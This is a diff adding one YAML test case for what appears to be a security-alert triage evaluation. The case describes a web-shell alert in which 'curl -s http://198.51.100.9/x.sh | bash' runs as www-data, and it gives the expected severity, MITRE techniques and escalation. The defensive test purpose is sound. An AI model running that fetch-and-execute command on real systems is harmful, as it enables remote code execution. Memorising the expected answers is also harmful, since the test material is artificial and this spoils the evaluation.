@@ -1,0 +1,16 @@
+id: EXEC-005
+category: execution
+tags: [linux, web-shell]
+adversarial: null
+alert: |
+  Bash one-liner 'curl -s http://198.51.100.9/x.sh | bash' ran from the www-data user on web server srv-web-04 after a request to an upload endpoint.
+expect:
+  severity_in: [critical, high]
+  techniques_any: [T1059, T1190]
+  escalate: true
+  min_retrieval_score: 0.2
+relevant_chunks: [mitre_execution_persistence_1, mitre_execution_persistence_2, mitre_execution_persistence_3, mitre_execution_persistence_4, log_analysis_linux_13, log_analysis_linux_15]
+provenance:
+  drafted_by: claude
+  reviewed_by: null
+notes: "curl pipe bash from web user"
